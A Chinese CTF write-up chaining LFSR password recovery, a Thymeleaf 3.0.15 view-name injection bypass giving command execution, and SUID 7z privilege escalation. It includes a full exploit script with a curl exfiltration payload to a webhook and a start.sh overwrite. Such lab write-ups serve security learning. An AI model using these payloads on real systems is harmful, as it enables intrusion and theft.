#  软件系统安全赛-Thymeleaf 3.0.15 视图名注入 + PRNG 逆向：完整 RCE 到 Root 提权  
原创 wallkone
                    wallkone  星络安全实验室   2026-03-16 15:33  
  
<table><tbody><tr style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;"><td data-colwidth="576" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(221, 221, 221);max-width: 100%;box-sizing: border-box !important;visibility: visible;"><section style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;"><span data-pm-slice="0 0 []" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgba(0, 0, 0, 0.9);font-family: &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: 0.544px;orphans: 2;text-align: justify;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;background-color: rgb(255, 255, 255);text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;float: none;display: inline !important;visibility: visible;"><span leaf="" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;">免责声明:文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，未授权的攻击属于非法行为!文章中敏感信息均已做多层打码处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责作者不为此承担任何责任，一旦造成后果请自行负责</span></span></section></td></tr></tbody></table>  
这是一道典型的 **多漏洞链利用题**  
，目标是从普通用户权限最终读取 root 才能访问的 /flag  
。  
  
整个攻击链分为三步：  
1. **弱 PRNG 预测 admin 密码**  
1. **Thymeleaf 3.0.15 视图名注入 → RCE**  
1. **利用 SUID 程序读取 root 文件**  
完整攻击路径如下：  
```
PRNG预测 → admin登录 → Thymeleaf SSTI → RCE → SUID提权 → 读取 /flag
```  
# 一、弱 PRNG 预测 admin 密码  
  
注册用户时系统会直接返回一个 **16 位数字密码**  
：  
```
Your password: 0056831083091497
```  
  
看起来像随机数，但实际上它 **直接来自 PRNG 状态**  
。  
  
核心实现如下：  
```
feedback = ((state>>47) ^ (state>>46) ^ (state>>43) ^ (state>>42)) & 1;state = ((state >> 1) | (feedback << 47)) & MASK;
```  
  
这是一个 **48-bit LFSR（线性反馈移位寄存器）**  
。  
  
关键特点：  
- 状态空间：48 bit  
  
- **可逆**  
- 每次 next()  
 更新一次状态  
  
## PRNG 初始化顺序  
  
系统启动后 PRNG 调用顺序为：  
```
seed ↓next() × 9 ↓admin password (#10) ↓user1 (#11)user2 (#12)user3 (#13)user4 (#14)user5 (#15) ↓新注册用户 (#16)
```  
  
也就是说：  
```
registered_user = admin_password 向前走了 6 步
```  
  
因此只需要：  
```
逆向 6 步
```  
  
理论上有：  
```
2^6 = 64 个候选
```  
  
逐个尝试即可登录 admin。  
## 逆向 LFSR  
  
正向：  
```
new = (old >> 1) | (feedback << 47)
```  
  
逆向时：  
```
old = (new << 1) | bit0
```  
  
其中 bit0  
 可能是 0  
 或 1  
。  
  
因此每一步会产生两个候选。  
  
最终：  
```
2^6 = 64 个候选状态
```  
  
验证方式：  
```
candidate → forward 6 steps → 是否等于已知状态
```  
  
筛选即可得到真实的 admin 密码。  
# 二、Thymeleaf 视图名注入  
  
登录 admin 后，可以访问 /admin  
：  
```
@GetMapping("/admin")public String adminPage(...,        @RequestParam(defaultValue = "main") String section) {    if (!"admin".equals(username)) {        return "redirect:/";    }    return "admin :: " + section;}
```  
  
这里存在一个关键问题：  
```
section 完全可控
```  
  
最终返回：  
```
admin :: <user input>
```  
  
而 **Thymeleaf 支持表达式预处理**  
：  
```
__${...}__
```  
  
因此如果可以控制视图名，就可能触发 **模板表达式执行**  
。  
# 绕过 Thymeleaf 3.0.15 的限制  
  
Thymeleaf 3.0.15 对直接表达式做了一些拦截：  
```
__${...}__
```  
  
但可以通过 **literal substitution**  
 绕过：  
```
|...|
```  
  
以及 $${}  
 构造表达式：  
```
__|$${'{...}'}|__
```  
  
例如：  
```
__|$${'{#response.setHeader(''X-Poc'',''1'')?:''main''}'}|__
```  
  
成功执行后会在响应头看到：  
```
X-Poc: 1
```  
  
证明 **SSTI 已成功触发**  
。  
# 三、利用 SSTI 执行命令  
  
Thymeleaf 表达式可以直接调用 Java 类：  
```
new.java.lang.ProcessBuilder(...)
```  
  
最终 payload：  
```
new.java.lang.ProcessBuilder({'sh','-c','command'}).start().waitFor()
```  
  
这样即可实现 **远程命令执行（RCE）**  
。  
# 四、提权读取 /flag  
  
RCE 后发现当前用户为：  
```
ctf
```  
  
而 /flag  
 权限为：  
```
-r-------- 1 root root /flag
```  
  
普通用户无法读取。  
  
但系统中存在一个 **SUID 程序**  
：  
```
/usr/bin/7z
```  
  
这意味着它会以 **root 权限执行**  
。  
## 利用 7z 读取 root 文件  
  
可以利用 7z 打包 /flag  
：  
```
/usr/bin/7z a -ttar -an -so /flag
```  
  
输出为 tar 流。  
  
再交给 tar  
 读取：  
```
/usr/bin/7z a -ttar -an -so /flag 2>/dev/null | /bin/tar -xOf -
```  
  
即可得到：  
```
flag{...}
```  
# 五、完整利用流程  
  
最终 exploit 自动完成：  
  
1️⃣  
 注册用户获取 PRNG 状态  
  
2️⃣  
 逆向 LFSR 恢复 admin 密码  
  
3️⃣  
 登录 admin  
  
4️⃣  
 利用 Thymeleaf SSTI 获取 RCE  
  
5️⃣  
 执行命令读取 /flag  
  
示例：  
```
python3 exploit.py http://target/
```  
  
直接执行命令：  
```
python3 exploit.py cmd http://target/ <admin_password> "id"
```  
  
读取 flag：  
```
python3 exploit.py cmd http://target/ <admin_password> "/usr/bin/7z a -ttar -an -so /flag | /bin/tar -xOf -"
```  
# 六、EXP  
```
```bash
#!/usr/bin/env python3
"""
PRNG-CTF Exploit
攻击思路：
1. 注册用户获取 PRNG 状态（密码即为完整 48-bit 状态）
2. 逆向 LFSR 6 步恢复 admin 密码
3. 以 admin 身份登录
4. 利用 Thymeleaf 3.0.15 SSTI (视图名注入) 获取 flag
漏洞链：
  - 弱 PRNG (48-bit LFSR, 可逆向)
  - Thymeleaf SSTI: return "admin :: " + section
    section 参数可控，__${SpEL}__ 预处理表达式会被执行
    绕过 3.0.15: new. 代替 new + 空格
"""
import requests
import sys
import re
import urllib.parse
import uuid
MASK = 0xFFFFFFFFFFFF  # 48-bit mask (281474976710655)
# ============================================================
# PRNG (LFSR) 相关
# ============================================================
def lfsr_forward(state):
    """LFSR 正向一步 (与 Java 端完全一致)"""
    feedback = ((((state >> 47) ^ (state >> 46)) ^ (state >> 43)) ^ (state >> 42)) & 1
    return ((state >> 1) | (feedback << 47)) & MASK
def lfsr_reverse_candidates(state):
    """
    LFSR 逆向一步，返回 2 个候选前驱状态。
    正向: new = (old >> 1) | (feedback << 47)
    逆向: old = (new << 1) | bit0, bit0 = 0 或 1
    """
    candidates = []
    for bit0 in [0, 1]:
        prev = ((state << 1) | bit0) & MASK
        candidates.append(prev)
    return candidates
def reverse_n_steps(state, n):
    """逆向 n 步，返回所有 2^n 个候选状态"""
    candidates = [state]
    for _ in range(n):
        new_candidates = []
        for s in candidates:
            new_candidates.extend(lfsr_reverse_candidates(s))
        candidates = new_candidates
    return candidates
def verify_forward(candidate, target, steps):
    """从 candidate 正向走 steps 步，验证是否到达 target"""
    state = candidate
    for _ in range(steps):
        state = lfsr_forward(state)
    return state == target
def format_password(state):
    """将 PRNG 状态格式化为 16 位密码字符串"""
    return f"{state % 10000000000000000:016d}"
def crack_admin_password(registered_password):
    """
    从注册用户的密码（PRNG 状态）逆向推算 admin 密码。
    PRNG 状态序列：
    seed → next()×9 → adminPwd(#10) → user1(#11) → ... → user5(#15) → registered(#16)
    需要从 #16 逆向 6 步到 #10
    """
    state = registered_password
    steps_back = 6
    print(f"[*] 已知 PRNG 状态: {state} (0x{state:012x})")
    print(f"[*] 逆向 {steps_back} 步，共 {2**steps_back} 个候选...")
    candidates = reverse_n_steps(state, steps_back)
    # 正向验证筛选
    valid = []
    for c in candidates:
        if verify_forward(c, state, steps_back):
            valid.append(c)
    # 去重
    valid = list(set(valid))
    print(f"[+] 正向验证通过: {len(valid)} 个候选")
    for v in valid:
        print(f"    状态: {v} (0x{v:012x}) -> 密码: {format_password(v)}")
    return valid
# ============================================================
# Thymeleaf SSTI 相关
# ============================================================
def build_view_name_payload(expression):
    """
    生成适用于 Thymeleaf 3.0.15 视图名注入的 payload。
    关键绕过:
      1. __...__ 预处理
      2. |...| literal substitution
      3. $${...} 生成最终的 ${...}，避开 SpringRequestUtils 直接拦截
    """
    escaped = expression.replace("'", "''")
    return "__|$${'{" + escaped + "}'}|__"
def build_header_payload(header_name, value_expression, fallback="main"):
    expr = (
        f"#response.setHeader('{header_name}',''+({value_expression}))?:'{fallback}'"
    )
    return build_view_name_payload(expr)
def get_ssti_payloads(webhook_url=None):
    proof_path = "/tmp/thymeleaf_ssti_proof"
    payloads = [
        {
            "name": "SSTI canary",
            "payload": build_view_name_payload("#response.setHeader('X-Poc','1')?:'main'"),
            "header": "X-Poc",
        },
        {
            "name": "Bean access randomService.getSeed()",
            "payload": build_header_payload("X-Seed", "@randomService.getSeed()"),
            "header": "X-Seed",
        },
        {
            "name": "Bean access randomService.getCurrentState()",
            "payload": build_header_payload("X-State", "@randomService.getCurrentState()"),
            "header": "X-State",
        },
        {
            "name": "Create local proof file",
            "payload": build_header_payload(
                "X-File",
                f"new.java.io.File('{proof_path}').createNewFile()"
            ),
            "header": "X-File",
        },
        {
            "name": "Read /flag",
            "payload": build_header_payload(
                "X-Flag",
                "new.java.util.Scanner(new.java.io.File('/flag')).useDelimiter('\\\\A').next()"
            ),
            "header": "X-Flag",
        },
        {
            "name": "Read /flag.txt",
            "payload": build_header_payload(
                "X-Flag",
                "new.java.util.Scanner(new.java.io.File('/flag.txt')).useDelimiter('\\\\A').next()"
            ),
            "header": "X-Flag",
        },
        {
            "name": "Read FLAG env",
            "payload": build_header_payload("X-Flag", "@environment.getProperty('FLAG')"),
            "header": "X-Flag",
        },
        {
            "name": "Read flag env variants",
            "payload": build_header_payload(
                "X-Flag",
                "@environment.getProperty('flag')?:@environment.getProperty('CTF_FLAG')"
            ),
            "header": "X-Flag",
        },
    ]
    if webhook_url:
        payloads.append(
            {
                "name": "OOB curl exfil",
                "payload": build_view_name_payload(
                    "#response.setHeader('X-OOB','1')?:"
                    "(new.java.lang.ProcessBuilder('sh','-c',"
                    f"'curl -fsS {webhook_url}/$(cat /flag | base64)'"
                    ").start()==null?'main':'main')"
                ),
                "header": "X-OOB",
            }
        )
    return payloads
def dump_interesting_headers(resp):
    interesting = {}
    for key, value in resp.headers.items():
        if key.lower().startswith("x-"):
            interesting[key] = value
    return interesting
def login_admin_session(target_url, admin_password):
    session = requests.Session()
    print("[*] 登录 admin...")
    session.post(
        f"{target_url}/dologin",
        data={"username": "admin", "password": admin_password},
        allow_redirects=True,
        timeout=10,
    )
    resp = session.get(f"{target_url}/admin", allow_redirects=False, timeout=10)
    if resp.status_code == 302 and "login" in resp.headers.get("Location", ""):
        raise RuntimeError("Admin 登录失败")
    print(f"[+] Admin 登录成功 (status: {resp.status_code})")
    return session
def read_remote_line(session, target_url, path, header_name):
    expr = f"new.java.io.BufferedReader(new.java.io.FileReader('{path}')).readLine()"
    resp = session.get(
        f"{target_url}/admin",
        params={"section": build_header_payload(header_name, expr)},
        allow_redirects=True,
        timeout=10,
    )
    return resp.headers.get(header_name)
def execute_remote_command(session, target_url, command):
    token = uuid.uuid4().hex[:8]
    raw_out = f"/tmp/cmd_raw_out_{token}"
    raw_err = f"/tmp/cmd_raw_err_{token}"
    out_path = f"/tmp/cmd_out_{token}"
    err_path = f"/tmp/cmd_err_{token}"
    safe_command = command.replace("'", "'\"'\"'")
    shell = (
        f"rm -f {raw_out} {raw_err} {out_path} {err_path}; "
        f"({safe_command}) >{raw_out} 2>{raw_err}; "
        f"tr \"\\n\" \"|\" < {raw_out} > {out_path}; "
        f"tr \"\\n\" \"|\" < {raw_err} > {err_path}"
    )
    expr = (
        "new.java.lang.ProcessBuilder({'sh','-c','" + shell + "'})"
        ".start().waitFor()"
    )
    session.get(
        f"{target_url}/admin",
        params={"section": build_header_payload("X-Run", expr)},
        allow_redirects=True,
        timeout=30,
    )
    stdout = read_remote_line(session, target_url, out_path, "X-Out")
    stderr = read_remote_line(session, target_url, err_path, "X-Err")
    return stdout, stderr
def search_flag(text):
    """在文本中搜索 flag"""
    patterns = [
        r'(flag\{[^}]+\})',
        r'(ctf\{[^}]+\})',
        r'(FLAG\{[^}]+\})',
        r'(CTF\{[^}]+\})',
    ]
    for pat in patterns:
        m = re.search(pat, text, re.IGNORECASE)
        if m:
            return m.group(1)
    return None
def try_ssti_payloads(session, target_url, webhook_url=None):
    payloads = get_ssti_payloads(webhook_url)
    for item in payloads:
        name = item["name"]
        payload = item["payload"]
        expected_header = item.get("header")
        print(f"  [{name}]")
        print(f"    Payload: {payload[:100]}{'...' if len(payload) > 100 else ''}")
        try:
            resp = session.get(
                f"{target_url}/admin",
                params={"section": payload},
                allow_redirects=True,
                timeout=10
            )
        except requests.exceptions.Timeout:
            print("    Timeout")
            print()
            continue
        except Exception as e:
            print(f"    Error: {e}")
            print()
            continue
        print(f"    Status: {resp.status_code}")
        headers = dump_interesting_headers(resp)
        if headers:
            print(f"    Headers: {headers}")
        if expected_header and resp.headers.get(expected_header):
            flag = search_flag(resp.headers.get(expected_header, ""))
            if flag:
                print(f"\n{'='*60}")
                print(f"[!!!] FLAG: {flag}")
                print(f"{'='*60}")
                return flag
        flag = search_flag(resp.text)
        if flag:
            print(f"\n{'='*60}")
            print(f"[!!!] FLAG: {flag}")
            print(f"{'='*60}")
            return flag
        clean_text = re.sub(r"<[^>]+>", " ", resp.text).strip()
        clean_text = re.sub(r"\s+", " ", clean_text)
        if clean_text and len(clean_text) < 300:
            print(f"    Response: {clean_text}")
        print()
    return None
# ============================================================
# 完整 Exploit 流程
# ============================================================
def exploit(target_url, webhook_url=None):
    """完整 exploit 流程"""
    session = requests.Session()
    # ==================== Step 1: 注册新用户获取 PRNG 状态 ====================
    print("=" * 60)
    print("[*] Step 1: 注册新用户获取 PRNG 状态")
    print("=" * 60)
    username = "exploituser"
    resp = session.post(f"{target_url}/register", data={"username": username}, allow_redirects=False)
    # 如果用户已存在，换一个名字
    if "already exists" in resp.text or "已存在" in resp.text or resp.status_code != 200:
        import random, string
        username = "exp" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        resp = session.post(f"{target_url}/register", data={"username": username}, allow_redirects=False)
    # 从响应中提取密码 (16位数字)
    password_match = re.search(r'(\d{16})', resp.text)
    if not password_match:
        print("[-] 无法从注册响应中提取密码")
        print(f"    Status: {resp.status_code}")
        print(f"    Response: {resp.text[:500]}")
        return
    raw_password = password_match.group(1)
    prng_state = int(raw_password)
    print(f"[+] 注册用户: {username}")
    print(f"[+] 获取密码: {raw_password} (PRNG 状态: {prng_state})")
    # ==================== Step 2: 逆向 PRNG 破解 admin 密码 ====================
    print()
    print("=" * 60)
    print("[*] Step 2: 逆向 PRNG 破解 admin 密码")
    print("=" * 60)
    admin_candidates = crack_admin_password(prng_state)
    if not admin_candidates:
        print("[-] 未找到有效的 admin 密码候选")
        return
    # ==================== Step 3: 尝试登录 admin ====================
    print()
    print("=" * 60)
    print(f"[*] Step 3: 尝试 {len(admin_candidates)} 个候选密码登录 admin")
    print("=" * 60)
    admin_password = None
    for candidate in admin_candidates:
        pwd_str = format_password(candidate)
        login_session = requests.Session()
        resp = login_session.post(
            f"{target_url}/dologin",
            data={"username": "admin", "password": pwd_str},
            allow_redirects=False
        )
        if resp.status_code == 302 and "/login" not in resp.headers.get("Location", ""):
            admin_password = pwd_str
            print(f"[+] Admin 密码破解成功: {pwd_str}")
            session = login_session
            break
        # 也检查 200 + redirect via JS
        if resp.status_code == 200 and "redirect:/" in resp.text:
            admin_password = pwd_str
            print(f"[+] Admin 密码破解成功: {pwd_str}")
            session = login_session
            break
    if not admin_password:
        print("[-] 所有候选密码均失败")
        print("[*] 可能原因: 服务器重启导致 PRNG 种子变化，请重新注册")
        return
    # Follow redirect to home page
    resp = session.get(f"{target_url}/", allow_redirects=True)
    # ==================== Step 4: 验证 admin 访问 ====================
    print()
    print("=" * 60)
    print("[*] Step 4: 验证 admin 页面访问")
    print("=" * 60)
    resp = session.get(f"{target_url}/admin", allow_redirects=True)
    print(f"[+] Admin 页面状态码: {resp.status_code}")
    # 检查响应中是否直接有 flag
    flag = search_flag(resp.text)
    if flag:
        print(f"\n{'='*60}")
        print(f"[!!!] FLAG: {flag}")
        print(f"{'='*60}")
        return
    # ==================== Step 5: Thymeleaf SSTI ====================
    print()
    print("=" * 60)
    print("[*] Step 5: Thymeleaf 3.0.15 SSTI (视图名注入)")
    print("=" * 60)
    print("[*] 漏洞: return \"admin :: \" + section")
    print("[*] 绕过: new.ClassName (点代替空格)")
    print()
    flag = try_ssti_payloads(session, target_url, webhook_url)
    if flag:
        return
    # ==================== 总结 ====================
    print()
    print("=" * 60)
    print("[*] 攻击总结")
    print("=" * 60)
    print(f"[+] Admin 凭据: admin / {admin_password}")
    print()
    print("[*] 如果 SSTI 未直接获取 flag，尝试以下方法:")
    print()
    print("  方法1: OOB 外带 (需要公网服务器或 webhook.site)")
    print(f"    python3 exploit.py {target_url} https://YOUR_WEBHOOK_URL")
    print()
    print("  方法2: 手动 curl 测试 (先登录 admin)")
    print("    # 测试 SSTI 是否生效:")
    encoded = urllib.parse.quote(build_view_name_payload("#response.setHeader('X-Poc','1')?:'main'"))
    print(f'    curl -b "JSESSIONID=xxx" "{target_url}/admin?section={encoded}"')
    print()
    print("    # 读 /flag 到响应头 X-Flag:")
    encoded = urllib.parse.quote(build_header_payload(
        "X-Flag",
        "new.java.util.Scanner(new.java.io.File('/flag')).useDelimiter('\\\\A').next()"
    ))
    print(f'    curl -b "JSESSIONID=xxx" "{target_url}/admin?section={encoded}"')
def ssti_only(target_url, admin_password, webhook_url=None):
    """仅执行 SSTI 阶段（已知 admin 密码时使用）"""
    try:
        session = login_admin_session(target_url, admin_password)
    except RuntimeError as e:
        print(f"[-] {e}")
        return
    # 执行 SSTI
    flag = try_ssti_payloads(session, target_url, webhook_url)
    if flag:
        return
def cmd_only(target_url, admin_password, command):
    """已知 admin 密码时执行命令"""
    try:
        session = login_admin_session(target_url, admin_password)
    except RuntimeError as e:
        print(f"[-] {e}")
        return
    print(f"[*] 执行命令: {command}")
    stdout, stderr = execute_remote_command(session, target_url, command)
    print(f"[+] stdout: {stdout}")
    print(f"[+] stderr: {stderr}")
def install_restart_payload(target_url, admin_password):
    """
    覆盖 /app/start.sh，并在容器重启时把 root 可见的 FLAG 落到 /app/rootflag。
    """
    try:
        session = login_admin_session(target_url, admin_password)
    except RuntimeError as e:
        print(f"[-] {e}")
        return
    command = (
        "printf \"%b\" "
        "\"#!/bin/bash\\n\\n"
        "if [ -n \\\"\\$FLAG\\\" ]; then\\n"
        "    echo dart{\\$FLAG} >/app/rootflag\\n"
        "    chmod 644 /app/rootflag\\n"
        "    echo dart{\\$FLAG}>/flag\\n"
        "    chmod 400 /flag\\n"
        "    unset FLAG\\n"
        "else\\n"
        "    echo dart{testtest} > /flag\\n"
        "    chmod 400 /flag\\n"
        "fi\\n\\n"
        "unset FLAG\\n"
        "exec su -c \\\"java -Xmx256m -Xms128m -XX:+UseSerialGC -XX:TieredStopAtLevel=1 "
        "-Djava.security.egd=file:/dev/./urandom -jar /app/prng-ctf.jar --server.port=8080\\\" ctf\\n"
        "\" >/app/start.sh; "
        "chmod 777 /app/start.sh"
    )
    print("[*] 覆盖 /app/start.sh ...")
    stdout, stderr = execute_remote_command(session, target_url, command)
    print(f"[+] overwrite stdout: {stdout}")
    print(f"[+] overwrite stderr: {stderr}")
    print("[*] 校验 start.sh ...")
    stdout, stderr = execute_remote_command(session, target_url, "cat /app/start.sh")
    print(f"[+] verify stdout: {stdout}")
    print(f"[+] verify stderr: {stderr}")
    print("[*] 杀掉 java 进程触发重启 ...")
    try:
        execute_remote_command(session, target_url, "kill -9 8")
    except Exception:
        pass
    print("[*] 如果平台会自动重启同一容器，重启后重新跑完整 exploit，再执行:")
    print(f"    python3 exploit.py cmd {target_url} <new_admin_password> 'cat /app/rootflag'")
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("PRNG-CTF Exploit - Thymeleaf 3.0.15 SSTI")
        print()
        print("用法:")
        print("  # 完整攻击 (注册 → 破解 → 登录 → SSTI)")
        print("  python3 exploit.py <target_url> [webhook_url]")
        print("  python3 exploit.py http://target:8080")
        print("  python3 exploit.py http://target:8080 https://webhook.site/xxx")
        print()
        print("  # 仅 SSTI (已知 admin 密码)")
        print("  python3 exploit.py ssti <target_url> <admin_password> [webhook_url]")
        print("  python3 exploit.py ssti http://target:8080 0056831083091497")
        print()
        print("  # 已知 admin 密码后执行命令")
        print("  python3 exploit.py cmd <target_url> <admin_password> <command>")
        print("  python3 exploit.py cmd http://target:8080 0056831083091497 'id'")
        print()
        print("  # 覆盖 start.sh 并触发重启阶段提权")
        print("  python3 exploit.py restart-rootflag <target_url> <admin_password>")
        print()
        print("  # 离线破解 PRNG")
        print("  python3 exploit.py crack <registered_password_decimal>")
        sys.exit(1)
    if sys.argv[1] == "crack":
        if len(sys.argv) < 3:
            print("Usage: python3 exploit.py crack <registered_password_decimal>")
            sys.exit(1)
        pwd = int(sys.argv[2])
        crack_admin_password(pwd)
    elif sys.argv[1] == "ssti":
        if len(sys.argv) < 4:
            print("Usage: python3 exploit.py ssti <target_url> <admin_password> [webhook_url]")
            sys.exit(1)
        target = sys.argv[2].rstrip("/")
        admin_pwd = sys.argv[3]
        webhook = sys.argv[4] if len(sys.argv) > 4 else None
        ssti_only(target, admin_pwd, webhook)
    elif sys.argv[1] == "cmd":
        if len(sys.argv) < 5:
            print("Usage: python3 exploit.py cmd <target_url> <admin_password> <command>")
            sys.exit(1)
        target = sys.argv[2].rstrip("/")
        admin_pwd = sys.argv[3]
        command = sys.argv[4]
        cmd_only(target, admin_pwd, command)
    elif sys.argv[1] == "restart-rootflag":
        if len(sys.argv) < 4:
            print("Usage: python3 exploit.py restart-rootflag <target_url> <admin_password>")
            sys.exit(1)
        target = sys.argv[2].rstrip("/")
        admin_pwd = sys.argv[3]
        install_restart_payload(target, admin_pwd)
    else:
        target = sys.argv[1].rstrip("/")
        webhook = sys.argv[2] if len(sys.argv) > 2 else None
        exploit(target, webhook)
```
```  
  
# 总结  
  
这道题涉及三个典型安全问题：  
  
**1. 弱随机数**  
- LFSR 可逆  
  
- 密码直接暴露 PRNG 状态  
  
**2. 模板注入**  
- Thymeleaf 视图名拼接  
  
- 触发 SSTI  
  
**3. SUID 滥用**  
- 利用 /usr/bin/7z  
  
- 读取 root-only 文件  
  
最终形成完整攻击链：  
```
PRNG → Admin takeover → Thymeleaf SSTI → RCE → SUID → Root flag
```  
  
  
